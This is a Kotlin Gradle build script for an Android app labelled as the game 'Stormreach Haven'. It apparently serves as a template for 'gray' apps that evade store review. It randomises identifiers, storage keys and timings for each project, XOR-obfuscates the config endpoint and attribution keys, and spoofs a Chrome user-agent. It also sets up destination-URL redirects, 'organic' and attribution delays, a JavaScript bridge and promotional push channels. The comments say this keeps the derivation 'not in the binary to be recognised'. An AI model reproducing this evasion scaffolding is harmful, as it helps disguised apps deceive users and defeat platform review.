import java.security.MessageDigest
import java.security.SecureRandom
import java.util.Base64
import java.util.Properties
import java.util.Random

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("com.google.gms.google-services")
}

// ═════════════════════════════════════════════════════════════════════════════
//  GRAY PART — per-project fingerprint
//
//  Everything below turns one line of gray.properties (gray.seed) into the
//  complete set of identifiers, constants and cipher parameters this app is
//  built with. Nothing here ships: derivation runs on the build machine and
//  only the results reach the APK, so the algorithm that produced them is not
//  in the binary to be recognised.
//
//  See .cursor/rules/kotlin_fingerprint.mdc for the full rationale.
// ═════════════════════════════════════════════════════════════════════════════

val grayFile = rootProject.file("gray.properties")
val gray = Properties().apply {
    if (grayFile.exists()) grayFile.inputStream().use { load(it) }
}
fun grayProp(key: String, fallback: String = ""): String =
    (gray.getProperty(key) ?: fallback).trim()

val graySeed        = grayProp("gray.seed", "CHANGE-ME-EVERY-PROJECT")
val grayBundleId    = grayProp("gray.bundleId", "com.stormreachhaven.stormreachgame")
val grayAppLabel    = grayProp("gray.appLabel", "Stormreach Haven")
val grayVersionCode = grayProp("gray.versionCode", "1").toInt()
val grayVersionName = grayProp("gray.versionName", "1.0.0")

if (graySeed == "CHANGE-ME-EVERY-PROJECT") {
    logger.warn(
        "[gray] gray.properties is missing or gray.seed is the default. " +
        "The build will succeed, but every derived identifier is the template " +
        "default and MUST NOT be shipped. Copy gray.properties.example → " +
        "gray.properties and run `gradlew graySeed` for a fresh seed."
    )
}

// ─── Deterministic per-project RNG ──────────────────────────────────────────
fun grayEscape(s: String): String =
    s.replace("\\", "\\\\").replace("\"", "\\\"")
fun bcStr(value: String): String = "\"" + grayEscape(value) + "\""

val seedHash: ByteArray = run {
    val md = MessageDigest.getInstance("SHA-256")
    md.update("gray-fingerprint".toByteArray(Charsets.UTF_8))
    md.update(0)
    md.update(graySeed.toByteArray(Charsets.UTF_8))
    var h = md.digest()
    repeat(4) { h = MessageDigest.getInstance("SHA-256").digest(h) }
    h
}
val seedLongA = (0..7).fold(0L)  { acc, i -> (acc shl 8) or (seedHash[i].toLong() and 0xFF) }
val seedLongB = (8..15).fold(0L) { acc, i -> (acc shl 8) or (seedHash[i].toLong() and 0xFF) }
val grayRng = Random(seedLongA xor seedLongB)

fun pick(range: IntRange): Int = grayRng.nextInt(range.last - range.first + 1) + range.first
fun pick(range: LongRange): Long =
    (grayRng.nextLong() and Long.MAX_VALUE) % (range.last - range.first + 1) + range.first
fun <T> pickOne(items: List<T>): T = items[grayRng.nextInt(items.size)]
fun pickToken(minLen: Int, maxLen: Int): String {
    val len = pick(minLen..maxLen)
    val chars = ('a'..'z') + ('0'..'9')
    return (1..len).joinToString("") { chars[grayRng.nextInt(chars.size)].toString() }
}

// ─── Derived: cipher parameters ────────────────────────────────────────────
val cipherSeedBytes: IntArray = IntArray(pick(24..40)) { grayRng.nextInt(256) }
val cipherMult: Int = pick(3..255) or 1
val cipherAdd:  Int = pick(0..255)
val codecVariant: Int = grayProp("gray.codecVariant", "1").toInt().coerceIn(1, 3)

fun grayEncode(text: String): List<Int> {
    val bytes = text.toByteArray(Charsets.UTF_8)
    val n = cipherSeedBytes.size
    return bytes.mapIndexed { i, raw ->
        val s = cipherSeedBytes[i % n] and 0xFF
        val mix = when (codecVariant) {
            1 -> (i * cipherMult + cipherAdd) and 0xFF
            2 -> ((i + 1) * cipherMult xor cipherAdd) and 0xFF
            else -> (((i * cipherMult) and 0xFF) + cipherAdd + (i shr 3)) and 0xFF
        }
        ((raw.toInt() and 0xFF) xor s xor mix) and 0xFF
    }
}

fun encodedArrayLiteral(text: String): String {
    if (text.isBlank()) return "new int[0]"
    val hex = grayEncode(text).joinToString(",") { "0x%02X".format(it) }
    return "new int[]{$hex}"
}

// ─── Derived: identifiers, constants, sentinels ────────────────────────────
val prefsFileName    = "s_" + pickToken(6, 10)
val securePrefsName  = "e_" + pickToken(6, 10)
val keyRunChannel    = pickToken(4, 8)
val keyDestUrl       = pickToken(4, 8)
val keyExpires       = pickToken(4, 8)
val keyPushCold      = pickToken(4, 8)
val keyNotifSkip     = pickToken(4, 8)
val keyNotifClosed   = pickToken(4, 8)
val keyFcm           = pickToken(4, 8)
val keyKbPortrait    = pickToken(4, 8)
val keyKbLandscape   = pickToken(4, 8)

val jsSafeAreaSentinel = "__" + pickToken(4, 8)
val jsKeyboardSentinel = "__" + pickToken(4, 8)
val jsBridgeName       = pickToken(5, 9).replaceFirstChar { it.uppercase() }

val fcmChannelId    = "ch_" + pickToken(6, 10)
val fcmChannelTitle = pickOne(listOf(
    "Promotions", "Bonuses", "Updates", "Offers",
    "Announcements", "Rewards", "Deals", "News"
))

val pushSnoozeSeconds   = pick(172_800L..604_800L)   // 2–7 days
val organicGcdDelayMs   = pick(3_500L..7_500L)
val configTimeoutMs     = pick(11_000L..22_000L)
val attributionFirstMs  = pick(22_000L..38_000L)
val attributionReturnMs = pick(7_000L..14_000L)
val deepLinkWaitMs      = pick(3_500L..7_000L)
val gcdTimeoutMs        = pick(7_500L..14_000L)
val connectGraceMs      = pick(2_500L..5_000L)
val safeAreaDelayMs     = pick(500L..1_400L)
val heartbeatMs         = pick(3_000L..6_500L)
val redirectRetryMax    = pick(4..8)

val chromeMajor = pickOne(listOf(146, 147, 148, 149, 150))
val chromeBuild = pick(6900..7900)
val chromePatch = pick(40..250)

// ─── Signing (Stormreach Haven keystore) ────────────────────────────────────
val keystoreProps = Properties()
val keystorePropsFile = rootProject.file("keystore.properties")
val hasKeystore = keystorePropsFile.exists()
if (hasKeystore) keystorePropsFile.inputStream().use { keystoreProps.load(it) }

android {
    namespace = "com.stormreachhaven.stormreachgame"
    compileSdk = 36

    defaultConfig {
        applicationId = grayBundleId
        minSdk = 24
        targetSdk = 36
        versionCode = grayVersionCode
        versionName = grayVersionName

        manifestPlaceholders["grayAppLabel"]      = grayAppLabel
        manifestPlaceholders["grayFcmChannelId"]  = fcmChannelId
        manifestPlaceholders["grayOneLinkHost"]   = grayProp("gray.oneLinkHost", "nolink.invalid")
        manifestPlaceholders["grayOneLinkVerify"] = grayProp("gray.oneLinkVerify", "false")

        // Identity, encoded credentials, storage keys, sentinels.
        buildConfigField("String", "GRAY_BUNDLE_ID",    bcStr(grayBundleId))
        buildConfigField("String", "GRAY_APP_LABEL",    bcStr(grayAppLabel))
        buildConfigField("String", "GRAY_UA_TOKEN",     bcStr(grayProp("gray.uaAppToken", "App")))
        buildConfigField("boolean","GRAY_UA_APP_SUFFIX", (grayProp("gray.uaAppSuffix", "false") == "true").toString())

        buildConfigField("int[]",  "SEC_CFG_ENDPOINT",  encodedArrayLiteral(grayProp("gray.configEndpoint")))
        buildConfigField("int[]",  "SEC_AF_KEY",        encodedArrayLiteral(grayProp("gray.appsFlyerKey")))
        buildConfigField("int[]",  "SEC_FB_PROJECT",    encodedArrayLiteral(grayProp("gray.firebaseProject")))
        buildConfigField("int[]",  "SEC_GCD_BASE",      encodedArrayLiteral(grayProp("gray.gcdBase")))

        buildConfigField("int[]",  "CIPHER_SEED",       "new int[]{${cipherSeedBytes.joinToString(",") { "0x%02X".format(it) }}}")
        buildConfigField("int",    "CIPHER_MULT",       cipherMult.toString())
        buildConfigField("int",    "CIPHER_ADD",        cipherAdd.toString())
        buildConfigField("int",    "CIPHER_VARIANT",    codecVariant.toString())

        buildConfigField("String", "PREFS_PLAIN",       bcStr(prefsFileName))
        buildConfigField("String", "PREFS_SECURE",      bcStr(securePrefsName))
        buildConfigField("String", "K_RUN_CHANNEL",     bcStr(keyRunChannel))
        buildConfigField("String", "K_DEST_URL",        bcStr(keyDestUrl))
        buildConfigField("String", "K_EXPIRES",         bcStr(keyExpires))
        buildConfigField("String", "K_PUSH_COLD",       bcStr(keyPushCold))
        buildConfigField("String", "K_NOTIF_SKIP",      bcStr(keyNotifSkip))
        buildConfigField("String", "K_NOTIF_CLOSED",    bcStr(keyNotifClosed))
        buildConfigField("String", "K_FCM",             bcStr(keyFcm))
        buildConfigField("String", "K_KB_PORTRAIT",     bcStr(keyKbPortrait))
        buildConfigField("String", "K_KB_LANDSCAPE",    bcStr(keyKbLandscape))

        buildConfigField("String", "JS_SAFE_AREA_SENTINEL", bcStr(jsSafeAreaSentinel))
        buildConfigField("String", "JS_KEYBOARD_SENTINEL",  bcStr(jsKeyboardSentinel))
        buildConfigField("String", "JS_BRIDGE_NAME",        bcStr(jsBridgeName))

        buildConfigField("String", "FCM_CHANNEL_ID",    bcStr(fcmChannelId))
        buildConfigField("String", "FCM_CHANNEL_TITLE", bcStr(fcmChannelTitle))

        buildConfigField("long",   "PUSH_SNOOZE_SEC",        "${pushSnoozeSeconds}L")
        buildConfigField("long",   "ORGANIC_GCD_DELAY_MS",   "${organicGcdDelayMs}L")
        buildConfigField("long",   "CONFIG_TIMEOUT_MS",      "${configTimeoutMs}L")
        buildConfigField("long",   "ATTRIBUTION_FIRST_MS",   "${attributionFirstMs}L")
        buildConfigField("long",   "ATTRIBUTION_RETURN_MS",  "${attributionReturnMs}L")
        buildConfigField("long",   "DEEP_LINK_WAIT_MS",      "${deepLinkWaitMs}L")
        buildConfigField("long",   "GCD_TIMEOUT_MS",         "${gcdTimeoutMs}L")
        buildConfigField("long",   "CONNECT_GRACE_MS",       "${connectGraceMs}L")
        buildConfigField("long",   "SAFE_AREA_DELAY_MS",     "${safeAreaDelayMs}L")
        buildConfigField("long",   "HEARTBEAT_MS",           "${heartbeatMs}L")
        buildConfigField("int",    "REDIRECT_RETRY_MAX",     redirectRetryMax.toString())

        buildConfigField("int",    "UA_CHROME_MAJOR",  chromeMajor.toString())
        buildConfigField("int",    "UA_CHROME_BUILD",  chromeBuild.toString())
        buildConfigField("int",    "UA_CHROME_PATCH",  chromePatch.toString())

        buildConfigField("String", "ALLOWED_HOSTS",   bcStr(grayProp("gray.allowedHosts")))
    }

    signingConfigs {
        if (hasKeystore) create("release") {
            storeFile     = rootProject.file(keystoreProps["storeFile"] as String)
            storePassword = keystoreProps["storePassword"] as String
            keyAlias      = keystoreProps["keyAlias"] as String
            keyPassword   = keystoreProps["keyPassword"] as String
        }
    }

    buildTypes {
        release {
            isMinifyEnabled   = true
            isShrinkResources = true
            if (hasKeystore) signingConfig = signingConfigs.getByName("release")
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            buildConfigField("String", "DEBUG_FORCE_URL", "\"\"")
        }
        debug {
            versionNameSuffix = "-debug"
            buildConfigField("String", "DEBUG_FORCE_URL", bcStr(grayProp("gray.debugForceUrl")))
        }
    }

    buildFeatures { buildConfig = true }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }

    bundle {
        language { enableSplit = true }
        density  { enableSplit = true }
        abi      { enableSplit = true }
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("androidx.activity:activity-ktx:1.9.3")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.7")

    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("androidx.security:security-crypto:1.1.0-alpha06")

    implementation(platform("com.google.firebase:firebase-bom:33.8.0"))
    implementation("com.google.firebase:firebase-messaging-ktx")
    implementation("com.google.firebase:firebase-analytics-ktx")
    implementation("com.google.firebase:firebase-appcheck-playintegrity")
    implementation("com.google.firebase:firebase-appcheck-debug")

    implementation("com.appsflyer:af-android-sdk:6.16.2")
    implementation("com.android.installreferrer:installreferrer:2.2")
}

// ─── graySeed task ──────────────────────────────────────────────────────────
tasks.register("graySeed") {
    group = "gray part"
    description = "Print a fresh cryptographic seed for gray.properties."
    doLast {
        val bytes = ByteArray(24)
        SecureRandom().nextBytes(bytes)
        val encoded = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes)
        println("gray.seed = $encoded")
    }
}

// ─── grayReport task ────────────────────────────────────────────────────────
tasks.register("grayReport") {
    group = "gray part"
    description = "Print the derived per-project fingerprint (do not commit output)."
    doLast {
        println("═══ gray fingerprint (seed=${graySeed.take(6)}…) ═══")
        println("bundleId       = $grayBundleId")
        println("prefs plain    = $prefsFileName")
        println("prefs secure   = $securePrefsName")
        println("run channel k  = $keyRunChannel")
        println("dest url k     = $keyDestUrl")
        println("fcm channel    = $fcmChannelId ($fcmChannelTitle)")
        println("js sentinels   = $jsSafeAreaSentinel / $jsKeyboardSentinel")
        println("js bridge      = $jsBridgeName")
        println("codec variant  = $codecVariant  mult=$cipherMult  add=$cipherAdd  seed bytes=${cipherSeedBytes.size}")
        println("timings ms     = cfg $configTimeoutMs / att1 $attributionFirstMs / attR $attributionReturnMs")
        println("push snooze s  = $pushSnoozeSeconds")
        println("redirect max   = $redirectRetryMax")
        println("chrome UA      = $chromeMajor.0.$chromeBuild.$chromePatch")
    }
}
